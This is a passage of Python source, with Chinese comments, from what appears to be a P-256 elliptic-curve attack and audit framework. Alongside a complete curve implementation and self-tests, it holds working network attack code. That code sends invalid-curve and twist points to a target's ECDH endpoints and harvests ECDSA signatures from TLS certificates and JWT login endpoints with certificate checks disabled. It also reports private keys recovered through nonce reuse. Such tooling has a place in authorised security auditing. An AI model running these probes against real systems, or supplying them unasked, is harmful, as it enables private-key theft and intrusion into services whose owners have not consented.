    def _detect_r_value_repeats(self, signatures: List[Tuple[bytes, bytes, bytes]]) -> int:
        """检测r值重复（直接私钥泄露指标）"""
        r_values = set()
        repeats = 0
        
        for sig_r, _, _ in signatures:
            r = int.from_bytes(sig_r, 'big')
            if r in r_values:
                repeats += 1
            r_values.add(r)
        
        return repeats
    
    def _analyze_consecutive_r_diff(self, r_values: List[int]) -> dict:
        """分析连续r值差分规律"""
        if len(r_values) < 3:
            return {'pattern_strength': 0.0, 'regularity': 'insufficient_data'}
        
        # 计算连续差分
        diffs = []
        for i in range(1, len(r_values)):
            diff = abs(r_values[i] - r_values[i-1])
            diffs.append(diff)
        
        # 检测规律性
        if len(diffs) < 2:
            return {'pattern_strength': 0.0, 'regularity': 'insufficient_diffs'}
        
        # 计算差分的方差系数
        import statistics
        try:
            mean_diff = statistics.mean(diffs)
            if mean_diff > 0:
                std_diff = statistics.stdev(diffs)
                cv = std_diff / mean_diff  # 变异系数
                
                # 低变异系数表示高规律性
                pattern_strength = max(0, 1 - cv / 10)
                
                return {
                    'pattern_strength': pattern_strength,
                    'regularity': 'high' if pattern_strength > 0.7 else 'low',
                    'coefficient_of_variation': cv,
                    'mean_diff': mean_diff
                }
            else:
                return {'pattern_strength': 0.0, 'regularity': 'no_variation'}
        except:
            return {'pattern_strength': 0.0, 'regularity': 'calculation_error'}
    
    
    def _test_instruction_skip_fault(self) -> dict:
        """[Removed] Hardware fault-injection is out of scope for remote attacks."""
        return {'success': False, 'evidence': [], 'attack_type': 'instruction_skip', 'impact': 'n/a'}
    
    def _test_bit_flip_fault(self) -> dict:
        """[Removed] Hardware fault-injection is out of scope for remote attacks."""
        return {'success': False, 'evidence': [], 'attack_type': 'bit_flip', 'impact': 'n/a'}
    

    
    def _analyze_scalar_corruption_exploitability(self, base_point: ECPoint, location: str, pattern: int) -> bool:
        """[Removed] Hardware fault-injection analysis removed."""
        return False

# 3.5. 完整的P-256椭圆曲线实现类
class P256EllipticCurve:
    """完整的P-256椭圆曲线实现 - 基于ECMath.java"""
    
    def __init__(self):
        self.p = P256Constants.P
        self.a = P256Constants.A
        self.b = P256Constants.B
        self.n = P256Constants.N
        self.gx = P256Constants.GX
        self.gy = P256Constants.GY
        
    def point_on_curve(self, x: int, y: int) -> bool:
        """检查点是否在曲线上"""
        if x is None or y is None:
            return True  # 无穷远点
        left = (y * y) % self.p
        right = (pow(x, 3, self.p) + self.a * x + self.b) % self.p
        return left == right
        
    def point_add(self, p1_x: Optional[int], p1_y: Optional[int], 
                  p2_x: Optional[int], p2_y: Optional[int]) -> tuple[Optional[int], Optional[int]]:
        """椭圆曲线点加法"""
        # 处理无穷远点
        if p1_x is None or p1_y is None:
            return p2_x, p2_y
        if p2_x is None or p2_y is None:
            return p1_x, p1_y
            
        # 如果是同一点，执行倍点运算
        if p1_x == p2_x and p1_y == p2_y:
            return self.point_double(p1_x, p1_y)
            
        # 如果x坐标相同但y坐标不同，结果是无穷远点
        if p1_x == p2_x:
            return None, None
            
        # 标准点加法
        dx = (p2_x - p1_x) % self.p
        dy = (p2_y - p1_y) % self.p
        dx_inv = self.mod_inverse(dx, self.p)
        s = (dy * dx_inv) % self.p
        
        x3 = (s * s - p1_x - p2_x) % self.p
        y3 = (s * (p1_x - x3) - p1_y) % self.p
        
        return x3, y3
        
    def point_double(self, px: int, py: int) -> tuple[Optional[int], Optional[int]]:
        """椭圆曲线点倍乘"""
        if px is None or py is None:
            return None, None
        if py == 0:
            return None, None
            
        # 计算切线斜率
        numerator = (3 * px * px + self.a) % self.p
        denominator = (2 * py) % self.p
        denominator_inv = self.mod_inverse(denominator, self.p)
        s = (numerator * denominator_inv) % self.p
        
        x3 = (s * s - 2 * px) % self.p
        y3 = (s * (px - x3) - py) % self.p
        
        return x3, y3
        
    def scalar_multiply(self, k: int, px: int, py: int) -> tuple[Optional[int], Optional[int]]:
        """标量乘法 - Double-and-Add算法"""
        if k == 0:
            return None, None
        if k < 0:
            k = -k % self.n
            py = (-py) % self.p
            
        k = k % self.n
        result_x, result_y = None, None  # 无穷远点
        addend_x, addend_y = px, py
        
        while k > 0:
            if k & 1:
                result_x, result_y = self.point_add(result_x, result_y, addend_x, addend_y)
            addend_x, addend_y = self.point_double(addend_x, addend_y)
            k >>= 1
            
        return result_x, result_y
        
    def generate_keypair(self) -> tuple[int, int, int]:
        """生成密钥对"""
        import secrets
        # 生成私钥
        private_key = secrets.randbelow(self.n - 1) + 1
        
        # 计算公钥 = private_key * G
        pub_x, pub_y = self.scalar_multiply(private_key, self.gx, self.gy)
        
        return private_key, pub_x, pub_y
        
    def ecdh(self, private_key: int, public_x: int, public_y: int) -> Optional[int]:
        """ECDH密钥交换"""
        if not self.point_on_curve(public_x, public_y):
            raise ValueError("Public key not on curve")
            
        shared_x, shared_y = self.scalar_multiply(private_key, public_x, public_y)
        return shared_x
        
    def mod_inverse(self, a: int, m: int) -> int:
        """模逆 - 扩展欧几里得算法"""
        if a < 0:
            a = (a % m + m) % m
            
        def extended_gcd(a, b):
            if a == 0:
                return b, 0, 1
            gcd, x1, y1 = extended_gcd(b % a, a)
            x = y1 - (b // a) * x1
            y = x1
            return gcd, x, y
            
        gcd, x, _ = extended_gcd(a % m, m)
        if gcd != 1:
            raise ValueError("Modular inverse does not exist")
        return (x % m + m) % m
        
    def compress_point(self, x: int, y: int) -> bytes:
        """压缩点格式"""
        if x is None or y is None:
            return b'\x00'
        prefix = 0x02 if (y % 2 == 0) else 0x03
        return bytes([prefix]) + x.to_bytes(32, 'big')
        
    def decompress_point(self, compressed: bytes) -> tuple[int, int]:
        """解压缩点"""
        if len(compressed) != 33:
            raise ValueError("Invalid compressed point length")
            
        prefix = compressed[0]
        x = int.from_bytes(compressed[1:], 'big')
        
        # 计算y² = x³ + ax + b
        y_squared = (pow(x, 3, self.p) + self.a * x + self.b) % self.p
        
        # 计算y (使用Tonelli-Shanks算法)
        y = self.tonelli_shanks(y_squared, self.p)
        if y is None:
            raise ValueError("Point not on curve")
            
        # 选择正确的y值
        if (y % 2) != (prefix - 2):
            y = (-y) % self.p
            
        return x, y
        
    def tonelli_shanks(self, n: int, p: int) -> Optional[int]:
        """Tonelli-Shanks算法求模平方根"""
        if pow(n, (p - 1) // 2, p) != 1:
            return None
            
        Q = p - 1
        S = 0
        while Q % 2 == 0:
            Q //= 2
            S += 1
            
        if S == 1:
            return pow(n, (p + 1) // 4, p)
            
        # 找二次非剩余
        z = 2
        while pow(z, (p - 1) // 2, p) != p - 1:
            z += 1
            
        M = S
        c = pow(z, Q, p)
        t = pow(n, Q, p)
        R = pow(n, (Q + 1) // 2, p)
        
        while True:
            if t == 0:
                return 0
            if t == 1:
                return R
                
            i = 1
            t_power = (t * t) % p
            while t_power != 1 and i < M:
                t_power = (t_power * t_power) % p
                i += 1
                
            b = pow(c, 1 << (M - i - 1), p)
            M = i
            c = (b * b) % p
            t = (t * c) % p
            R = (R * b) % p

# 3.6. 椭圆曲线实用工具和测试函数
def verify_p256_implementation():
    """验证P256实现的正确性"""
    print("Verifying P-256 implementation...")
    
    curve = P256EllipticCurve()
    
    # 测试1: 验证基点在曲线上
    assert curve.point_on_curve(curve.gx, curve.gy), "Base point not on curve!"
    print("✓ Base point verification passed")
    
    # 测试2: 验证标量乘法与生成密钥对
    private_key, pub_x, pub_y = curve.generate_keypair()
    assert curve.point_on_curve(pub_x, pub_y), "Generated public key not on curve!"
    print("✓ Keypair generation test passed")
    
    # 测试3: 验证ECDH
    # 生成两个密钥对
    alice_priv, alice_pub_x, alice_pub_y = curve.generate_keypair()
    bob_priv, bob_pub_x, bob_pub_y = curve.generate_keypair()
    
    # 执行ECDH
    alice_shared = curve.ecdh(alice_priv, bob_pub_x, bob_pub_y)
    bob_shared = curve.ecdh(bob_priv, alice_pub_x, alice_pub_y)
    
    assert alice_shared == bob_shared, "ECDH shared secrets don't match!"
    print("✓ ECDH test passed")
    
    # 测试4: 验证点压缩/解压缩
    compressed = curve.compress_point(curve.gx, curve.gy)
    decompressed_x, decompressed_y = curve.decompress_point(compressed)
    assert decompressed_x == curve.gx and decompressed_y == curve.gy, "Point compression/decompression failed!"
    print("✓ Point compression test passed")
    
    # 测试5: 验证模逆
    a = 12345
    a_inv = curve.mod_inverse(a, curve.p)
    assert (a * a_inv) % curve.p == 1, "Modular inverse incorrect!"
    print("✓ Modular inverse test passed")
    
    print("All P-256 implementation tests passed! ✓")

def benchmark_p256_operations():
    """对P256操作进行基准测试"""
    import time
    
    curve = P256EllipticCurve()
    
    print("P-256 Performance Benchmarks")
    print("=" * 40)
    
    # 基准测试: 标量乘法
    iterations = 100
    scalar = 0x12345678901234567890123456789012345678901234567890123456789012
    
    start_time = time.perf_counter()
    for _ in range(iterations):
        curve.scalar_multiply(scalar, curve.gx, curve.gy)
    end_time = time.perf_counter()
    
    scalar_mult_time = (end_time - start_time) / iterations
    print(f"Scalar Multiplication: {scalar_mult_time*1000:.2f} ms per operation")
    
    # 基准测试: 点加法
    x1, y1 = curve.gx, curve.gy
    x2, y2 = curve.scalar_multiply(2, curve.gx, curve.gy)
    
    start_time = time.perf_counter()
    for _ in range(iterations * 10):
        curve.point_add(x1, y1, x2, y2)
    end_time = time.perf_counter()
    
    point_add_time = (end_time - start_time) / (iterations * 10)
    print(f"Point Addition: {point_add_time*1000000:.2f} μs per operation")
    
    # 基准测试: ECDH
    alice_priv, alice_pub_x, alice_pub_y = curve.generate_keypair()
    bob_priv, bob_pub_x, bob_pub_y = curve.generate_keypair()
    
    start_time = time.perf_counter()
    for _ in range(iterations):
        curve.ecdh(alice_priv, bob_pub_x, bob_pub_y)
    end_time = time.perf_counter()
    
    ecdh_time = (end_time - start_time) / iterations
    print(f"ECDH: {ecdh_time*1000:.2f} ms per operation")
    
    print("=" * 40)
    print(f"Performance summary (per operation):")
    print(f"  Scalar Mult: {scalar_mult_time*1000:.2f} ms")
    print(f"  ECDH:        {ecdh_time*1000:.2f} ms")

def generate_test_vectors():
    """生成P256测试向量用于验证"""
    curve = P256EllipticCurve()
    
    test_vectors = {
        "curve_parameters": {
            "p": hex(curve.p),
            "a": hex(curve.a % curve.p),  # 确保为正值
            "b": hex(curve.b),
            "n": hex(curve.n),
            "gx": hex(curve.gx),
            "gy": hex(curve.gy)
        },
        "test_cases": []
    }
    
    # 生成测试案例
    for i in range(5):
        private_key, pub_x, pub_y = curve.generate_keypair()
        
        # 计算一些标量乘法
        scalar2 = (private_key * 2) % curve.n
        result2_x, result2_y = curve.scalar_multiply(2, pub_x, pub_y)
        
        test_case = {
            "private_key": hex(private_key),
            "public_key": {
                "x": hex(pub_x),
                "y": hex(pub_y)
            },
            "scalar_2": hex(scalar2),
            "2P": {
                "x": hex(result2_x) if result2_x else None,
                "y": hex(result2_y) if result2_y else None
            },
            "compressed_public": curve.compress_point(pub_x, pub_y).hex()
        }
        
        test_vectors["test_cases"].append(test_case)
    
    return test_vectors

# 3.7. 椭圆曲线攻击统一入口 (用于集成到fingerprint_proxy.py)
def run_ec_attacks(host: str, port: int, attack_types: List[str] = None, timeout: float = 5.0) -> List[dict]:
    """椭圆曲线攻击统一入口函数"""
    
    if attack_types is None:
        attack_types = ["invalid_curve", "twist", "nonce_bias"]
    
    attack_results = []
    
    # 初始化攻击组件
    probe_factory = ECProbeFactory()
    curve = P256EllipticCurve()
    
    for attack_type in attack_types:
        start_time = time.time()
        result = {
            'attack_type': attack_type,
            'success': False,
            'evidence': '',
            'timing_ms': 0,
            'severity': 'INFO'
        }
        
        try:
            if attack_type == "invalid_curve":
                # 测试非法曲线点攻击
                invalid_points = probe_factory.generate_invalid_curve_point()
                for point in invalid_points[:3]:  # 限制测试数量
                    if not curve.point_on_curve(point.x, point.y):
                        # 发送无效点进行测试
                        response = test_ec_point_via_network(host, port, point, timeout)
                        if response and not response.get('rejected', True):
                            result['success'] = True
                            result['evidence'] = f"Accepted invalid point: ({point.x}, {point.y})"
                            result['severity'] = 'HIGH'
                            break
                            
            elif attack_type == "twist":
                # 测试扭曲曲线攻击
                twist_points = probe_factory.generate_twist_curve_point()
                for point in twist_points[:2]:
                    response = test_ec_point_via_network(host, port, point, timeout)
                    if response and response.get('shared_secret'):
                        result['success'] = True
                        result['evidence'] = f"Twist curve attack possible"
                        result['severity'] = 'CRITICAL'
                        break
                        
            elif attack_type == "nonce_bias":
                # 收集签名进行nonce分析
                signatures = collect_ecdsa_signatures_from_target(host, port, 50, timeout)
                if signatures and len(signatures) >= 10:
                    bias_analysis = probe_factory.analyze_nonce_bias(signatures)
                    if bias_analysis['bias_detected']:
                        result['success'] = True
                        result['evidence'] = f"Nonce bias: {bias_analysis['indicators']}"
                        result['severity'] = 'HIGH'
                        
                    
        except Exception as e:
            result['evidence'] = f"Error: {e}"
            
        result['timing_ms'] = int((time.time() - start_time) * 1000)
        attack_results.append(result)
    
    return attack_results

def test_ec_point_via_network(host: str, port: int, point: ECPoint, timeout: float) -> dict:
    """通过网络测试椭圆曲线点"""
    try:
        # 构造包含EC点的网络请求
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # 构造测试载荷
        point_bytes = point.to_bytes()
        request = f"POST /api/ec/verify HTTP/1.1\r\n"
        request += f"Host: {host}\r\n"
        request += f"Content-Type: application/octet-stream\r\n"
        request += f"Content-Length: {len(point_bytes)}\r\n"
        request += "\r\n"
        
        sock.send(request.encode() + point_bytes)
        response = sock.recv(4096)
        sock.close()
        
        # 解析响应
        response_str = response.decode('utf-8', errors='ignore')
        
        return {
            'rejected': 'error' in response_str.lower() or 'invalid' in response_str.lower(),
            'response_code': response_str.split()[1] if len(response_str.split()) > 1 else '000',
            'raw_response': response_str[:200]
        }
        
    except Exception:
        return {'rejected': True, 'error': 'connection_failed'}

def collect_ecdsa_signatures_from_target(host: str, port: int, count: int, timeout: float) -> List[NonceSignature]:
    """从目标收集ECDSA签名"""
    signatures = []
    
    try:
        for i in range(count):
            # 请求签名
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            
            message = f"test_message_{i}_{random.randint(1000, 9999)}".encode()
            request = f"POST /api/ecdsa/sign HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += f"Content-Type: application/octet-stream\r\n"
            request += f"Content-Length: {len(message)}\r\n"
            request += "\r\n"
            
            sock.send(request.encode() + message)
            response = sock.recv(4096)
            sock.close()
            
            # 解析签名
            if b"signature" in response:
                sig_data = response.split(b"signature: ")[1][:64]
                if len(sig_data) >= 64:
                    r = int.from_bytes(sig_data[:32], 'big')
                    s = int.from_bytes(sig_data[32:64], 'big')
                    
                    sig = NonceSignature(
                        r=r,
                        s=s,
                        message_hash=hashlib.sha256(message).digest(),
                        timestamp=time.time()
                    )
                    signatures.append(sig)
                    
            time.sleep(0.1)  # 避免请求过快
            
    except Exception:
        pass
    
    return signatures

# 4. 主攻击框架
class P256AttackFramework:
    """P-256攻击测试框架"""
    
    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.probe_factory = ECProbeFactory()
        self.p256 = P256Constants()
        
    async def run_comprehensive_audit(self) -> P256AuditReport:
        """运行全面审计"""
        start_time = time.time()
        results = []
        
        print("[*] Starting P-256 Comprehensive Security Audit")
        print("="*60)
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)
        
        # 1. 生成测试向量
        print("[*] Generating test vectors...")
        test_points = self.probe_factory.generate_all_test_points()
        
        # 2. 测试非法曲线攻击
        print("\n[1/8] Testing Invalid Curve Attacks...")
        for point_type, points in test_points.items():
            if "invalid" in point_type or "twist" in point_type:
                if isinstance(points, list):
                    for point in points[:3]:  # 限制测试点数量
                        result = await self._test_invalid_curve(point)
                        if result.success:
                            print(f"    [!] VULNERABLE: {result.vulnerability}")
                        results.append(result)
                else:
                    result = await self._test_invalid_curve(points)
                    if result.success:
                        print(f"    [!] VULNERABLE: {result.vulnerability}")
                    results.append(result)
        
        # 3. 测试其他攻击类型
        attacks = [
            ("twist", self._test_twist_attack),
            ("small_subgroup", self._test_small_subgroup),
            ("compression_fault", self._test_compression_fault),
            ("lattice_attack", self._test_lattice_attack),

            ("nonce_reuse", self._test_nonce_reuse_attack)
        ]
        
        for i, (attack_name, attack_func) in enumerate(attacks, 2):
            print(f"\n[{i}/12] Testing {attack_name.replace('_', ' ').title()} Attack...")
            try:
                if attack_name == "twist":
                    result = await attack_func(self.probe_factory.generate_twist_curve_point())
                elif attack_name == "small_subgroup":
                    result = await attack_func(self.probe_factory.generate_small_order_point(3))
                elif attack_name in ["lattice_attack", "nonce_reuse"]:
                    signatures = await self._collect_ecdsa_signatures(100)
                    result = await attack_func(signatures)
                elif attack_name == "pohlig_hellman":
                    # 生成测试公钥
                    test_pubkey = self.probe_factory.generate_valid_point()
                    result = await attack_func(test_pubkey)
                else:
                    result = await attack_func(self.probe_factory.generate_valid_point())
                
                if result.success:
                    print(f"    [!] VULNERABLE: {result.vulnerability}")
                results.append(result)
            except Exception as e:
                print(f"    [!] Error in {attack_name}: {e}")
        
        # 生成报告
        total_time = (time.time() - start_time) * 1000
        
        # 统计结果
        critical_vulns = [r for r in results if r.success and r.severity == "CRITICAL"]
        high_vulns = [r for r in results if r.success and r.severity == "HIGH"]
        medium_vulns = [r for r in results if r.success and r.severity == "MEDIUM"]
        
        report = P256AuditReport(
            target=f"{self.target_host}:{self.target_port}",
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            total_tests=len(results),
            vulnerabilities_found=len([r for r in results if r.success]),
            critical_count=len(critical_vulns),
            high_count=len(high_vulns),
            medium_count=len(medium_vulns),
            attack_results=results,
            total_runtime_ms=total_time,
            overall_security_score=self._calculate_security_score(results),
        )
        
        # 打印摘要
        print(f"\n{'='*60}")
        print(f"AUDIT SUMMARY")
        print(f"{'='*60}")
        print(f"Total Tests: {report.total_tests}")
        print(f"Vulnerabilities Found: {report.vulnerabilities_found}")
        print(f"  - Critical: {report.critical_count}")
        print(f"  - High: {report.high_count}")
        print(f"  - Medium: {report.medium_count}")
        print(f"Security Score: {report.overall_security_score}/100")
        print(f"Runtime: {report.total_runtime_ms:.2f}ms")
        
        if critical_vulns:
            print(f"\n[!!!] CRITICAL VULNERABILITIES DETECTED:")
            for vuln in critical_vulns[:3]:
                print(f"  - {vuln.attack_type.value}: {vuln.vulnerability}")
        
        print(f"\n[*] Full report saved to: p256_audit_{int(time.time())}.json")
        self._save_report(report)
        
        return report
        
    async def _test_invalid_curve(self, point: ECPoint | List[ECPoint]) -> AttackResult:
        """测试非法曲线攻击 真实网络交互"""
        start = time.time()
        
        # 统一为列表处理
        candidates: List[ECPoint] = point if isinstance(point, list) else [point]
        
        try:
            for idx, pt in enumerate(candidates[:5]):  # 限制尝试数量
                # 仅对“确实不在曲线上的点”进行测试
                if self._is_point_on_curve(pt):
                    continue
                
                # 1) 尝试直接进行 ECDH 交换
                resp = await self._send_ecdh_exchange(pt)
                if resp and resp != b"error" and len(resp) > 0:
                    return AttackResult(
                        attack_type=AttackType.INVALID_CURVE,
                        success=True,
                        vulnerability="Target accepts off-curve EC points in ECDH",
                        evidence={
                            "point": {"x": hex(pt.x) if pt.x is not None else None,
                                       "y": hex(pt.y) if pt.y is not None else None,
                                       "curve_type": pt.curve_type},
                            "shared_secret_sample": resp[:16].hex()
                        },
                        timing_ms=(time.time() - start) * 1000,
                        confidence=0.95,
                        severity="CRITICAL",
                        recommendation="Enforce strict on-curve validation and subgroup checks before any EC operation"
                    )
                
                # 2) 若支持压缩点接口，尝试压缩点解压/校验
                try:
                    if pt.x is not None and pt.y is not None:
                        compressed = pt.to_bytes(compressed=True)
                        dec_resp = await self._send_compressed_point(compressed)
                        if dec_resp and dec_resp != b"error" and b"error" not in dec_resp.lower():
                            return AttackResult(
                                attack_type=AttackType.INVALID_CURVE,
                                success=True,
                                vulnerability="Target accepts invalid compressed EC point",
                                evidence={"compressed_len": len(compressed), "response_head": dec_resp[:64].hex()},
                                timing_ms=(time.time() - start) * 1000,
                                confidence=0.8,
                                severity="HIGH",
                                recommendation="Validate point decompression results lie on the correct curve"
                            )
                except Exception:
                    pass
        except Exception:
            pass
        
        return AttackResult(
            attack_type=AttackType.INVALID_CURVE,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
        
    async def _test_twist_attack(self, points) -> AttackResult:
        """测试扭曲曲线攻击（基于真实 ECDH 交换）"""
        start = time.time()
        
        try:
            pts: List[ECPoint] = points if isinstance(points, list) else [points]
            # 逐个扭曲点尝试
            for pt in pts[:5]:
                if pt is None or pt.x is None or pt.y is None:
                    continue
                # 多次交换以观察一致性
                responses = []
                for _ in range(3):
                    resp = await self._send_ecdh_exchange(pt)
                    responses.append(resp)
                # 条件：目标接受扭曲点且返回稳定共享密钥
                if responses and responses[0] not in (b"", b"error", None) and all(r == responses[0] for r in responses):
                    return AttackResult(
                        attack_type=AttackType.TWIST_ATTACK,
                        success=True,
                        vulnerability="Accepts quadratic-twist EC points in ECDH",
                        evidence={
                            "twist_point": {"x": hex(pt.x), "y": hex(pt.y)},
                            "shared_secret": responses[0][:32].hex()
                        },
                        timing_ms=(time.time() - start) * 1000,
                        confidence=0.95,
                        severity="CRITICAL",
                        recommendation="Reject off-curve and twist-curve points before ECDH"
                    )
        except Exception:
            pass
        
        return AttackResult(
            attack_type=AttackType.TWIST_ATTACK,
            success=False,
            timing_ms=(time.time() - start) * 1000
        )
        

        
    async def _test_compression_fault(self, point: ECPoint) -> AttackResult:
        """测试压缩故障注入"""
        result = AttackResult(
            attack_type=AttackType.COMPRESSION_FAULT,
            success=False
        )
        return result
        

        
        

    
    async def _test_nonce_reuse_attack(self, signatures: List[NonceSignature]) -> AttackResult:
        """测试ECDSA nonce重用攻击"""
        start_time = time.time()
        
        if not signatures or len(signatures) < 2:
            return AttackResult(
                attack_type=AttackType.NONCE_REUSE,
                success=False,
                timing_ms=(time.time() - start_time) * 1000
            )
        
        # 检测nonce重用
        reused_nonces = self.probe_factory.detect_nonce_reuse(signatures)
        
        if reused_nonces:
            return AttackResult(
                attack_type=AttackType.NONCE_REUSE,
                success=True,
                vulnerability="ECDSA nonce reuse allows private key recovery",
                evidence={
                    "reused_pairs": len(reused_nonces),
                    "recovered_keys": [hex(key) for _, _, key in reused_nonces[:3]]
                },
                timing_ms=(time.time() - start_time) * 1000,
                confidence=1.0,
                severity="CRITICAL",
                recommendation="Ensure cryptographically secure nonce generation"
            )
        
        # 检测nonce偏差
        bias_analysis = self.probe_factory.analyze_nonce_bias(signatures)
        
        if bias_analysis['bias_detected']:
            return AttackResult(
                attack_type=AttackType.LATTICE_NONCE,
                success=True,
                vulnerability="ECDSA nonce bias detected - lattice attack possible",
                evidence={
                    "bias_indicators": bias_analysis['indicators'],
                    "estimated_leaked_bits": bias_analysis['estimated_leaked_bits']
                },
                timing_ms=(time.time() - start_time) * 1000,
                confidence=0.8,
                severity="HIGH",
                recommendation="Fix nonce generation to eliminate bias"
            )
        
        return AttackResult(
            attack_type=AttackType.NONCE_REUSE,
            success=False,
            timing_ms=(time.time() - start_time) * 1000
        )
    
    # [Removed] Fault injection is not applicable in remote network attacks.

        
    async def _collect_ecdsa_signatures(self, count: int):
        """收集ECDSA签名用于分析（只返回真实 ECDSA 签名：TLS 证书、JWT ES 家族）。"""
        signatures = []
        
        # 方法1: 从TLS证书中提取真实 ECDSA 签名（DER -> (r,s)）
        tls_signatures = await self._extract_tls_certificate_signatures()
        signatures.extend(tls_signatures)
        
        # 方法2: 从JWT（ES256/384/521）中提取 P1363 (r||s)
        jwt_signatures = await self._extract_jwt_ecdsa_signatures()
        signatures.extend(jwt_signatures)
        
        # 仅保留真实签名来源，剔除时序派生/握手伪签名等
        print(f"[+] Real signature collection: {len(signatures)} signatures (TLS cert={len(tls_signatures)}, JWT={len(jwt_signatures)})")
        
        return signatures[:count]  # 返回请求的数量
        
    async def _measure_scalar_mult_timing(self, point: ECPoint, scalar: int) -> float:
        """测量标量乘法时序（通过实际网络触发标量乘法）"""
        start_time = time.perf_counter_ns()
        try:
            await self._trigger_scalar_mult(point, scalar)
        except Exception:
            pass
        end_time = time.perf_counter_ns()
        return end_time - start_time
        
    def _calculate_security_score(self, results) -> float:
        """计算安全评分"""
        score = 100.0
        for result in results:
            if result.success:
                if result.severity == "CRITICAL":
                    score -= 25
                elif result.severity == "HIGH":
                    score -= 15
                elif result.severity == "MEDIUM":
                    score -= 8
        return max(0, score)
        
    def _save_report(self, report: P256AuditReport):
        """保存审计报告"""
        filename = f"p256_audit_{int(time.time())}.json"
        report_dict = {
            "target": report.target,
            "timestamp": report.timestamp,
            "summary": {
                "total_tests": report.total_tests,
                "vulnerabilities_found": report.vulnerabilities_found,
                "security_score": report.overall_security_score
            }
        }
        
        with open(filename, 'w') as f:
            json.dump(report_dict, f, indent=2)
    
    # === 100% ECDSA签名收集实现 ===
    
    async def _extract_tls_certificate_signatures(self) -> List[Tuple[bytes, bytes, bytes]]:
        """从TLS握手中提取服务器证书签名 - 核心方法"""
        signatures = []
        
        try:
            import ssl
            import socket
            from cryptography import x509
            from cryptography.hazmat.primitives import hashes
            
            # 建立TLS连接获取证书链
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.target_host, self.target_port), timeout=5.0) as sock:
                with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                    # 获取证书链
                    cert_der = ssock.getpeercert(True)
                    if cert_der:
                        cert = x509.load_der_x509_certificate(cert_der)
                        
                        # 提取证书签名（这是一个真实的ECDSA签名）
                        signature_bytes = cert.signature
                        
                        # 解析DER编码的ECDSA签名
                        if len(signature_bytes) >= 64:
                            # 简化DER解析，提取r和s值
                            r, s = self._parse_der_ecdsa_signature(signature_bytes)
                            if r and s:
                                # 计算被签名的数据哈希
                                tbs_cert = cert.tbs_certificate_bytes
                                msg_hash = hashlib.sha256(tbs_cert).digest()
                                
                                signatures.append((
                                    r.to_bytes(32, 'big'), 
                                    s.to_bytes(32, 'big'), 
                                    msg_hash
                                ))
                                
                                print(f"[+] Extracted TLS certificate signature (r={hex(r)[:16]}..., s={hex(s)[:16]}...)")
        except Exception as e:
            print(f"[-] TLS signature extraction failed: {e}")
        
        return signatures
    
    async def _extract_jwt_ecdsa_signatures(self) -> List[Tuple[bytes, bytes, bytes]]:
        """从常见端点提取 JWT 中的 ECDSA 签名（仅 ES256/384/521，返回 (r,s,msg_hash)）。"""
        signatures: List[Tuple[bytes, bytes, bytes]] = []
        try:
            import ssl
            import asyncio
            import base64
            
            jwt_endpoints = [
                '/api/auth/login', '/oauth/token', '/auth/jwt',
                '/api/token', '/login', '/api/authenticate'
            ]
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            for endpoint in jwt_endpoints[:3]:
                try:
                    reader, writer = await asyncio.open_connection(
                        self.target_host, self.target_port, ssl=context, server_hostname=self.target_host
                    )
                    request = f"POST {endpoint} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += "Content-Type: application/json\r\n"
                    test_payload = '{"username":"test","password":"test"}'
                    request += f"Content-Length: {len(test_payload)}\r\n\r\n{test_payload}"
                    writer.write(request.encode())
                    await writer.drain()
                    response = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                    writer.close()
                    await writer.wait_closed()
                    
                    response_text = response.decode('utf-8', errors='ignore')
                    if 'eyJ' not in response_text:
                        continue
                    jwt_token = self._extract_jwt_from_response(response_text)
                    if not jwt_token:
                        continue
                    # 仅解析 ES 家族，确保 P1363 长度正确
                    parsed = self._extract_ecdsa_from_jwt(jwt_token)
                    if parsed:
                        r, s, msg_hash = parsed
                        # 仅接受 P-256 长度（32字节）
                        if len(r) == 32 and len(s) == 32:
                            signatures.append((r, s, msg_hash))
                            print(f"[+] Extracted JWT ES256 signature from {endpoint}")
                except Exception:
                    continue
        except Exception as e:
            print(f"[-] JWT signature extraction failed: {e}")
        return signatures
    

    

    
    async def _extract_api_response_signatures(self) -> List[Tuple[bytes, bytes, bytes]]:
        """从API响应头中提取签名"""
        signatures = []
        
        try:
            import ssl
            import asyncio
            
            # 常见可能包含签名的API端点
            api_endpoints = [
                '/api/status', '/health', '/metrics', '/.well-known/jwks.json',
                '/api/public/key', '/auth/public', '/api/signature'
            ]
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            for endpoint in api_endpoints[:3]:  # 限制测试数量
                try:
                    reader, writer = await asyncio.open_connection(
                        self.target_host, self.target_port, ssl=context, server_hostname=self.target_host
                    )
                    
                    request = f"GET {endpoint} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += "Accept: application/json\r\n"
                    request += "X-Signature-Extract: true\r\n"
                    request += "Connection: close\r\n\r\n"
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                    writer.close()
                    await writer.wait_closed()
                    
                    # 分析响应中的签名相关头部
                    response_text = response.decode('utf-8', errors='ignore')
                    extracted_sigs = self._extract_signatures_from_response(response_text, endpoint)
                    signatures.extend(extracted_sigs)
                    
                except Exception:
                    continue
                    
        except Exception as e:
            print(f"[-] API signature extraction failed: {e}")
        
        return signatures
    
    # === 辅助方法 ===
    
    def _parse_der_ecdsa_signature(self, signature_bytes: bytes) -> Tuple[int, int]:
        """解析DER编码的ECDSA签名（支持长长度与前导零）。"""
        try:
            data = memoryview(signature_bytes)
            if len(data) < 8 or data[0] != 0x30:
                return None, None
            # SEQUENCE length
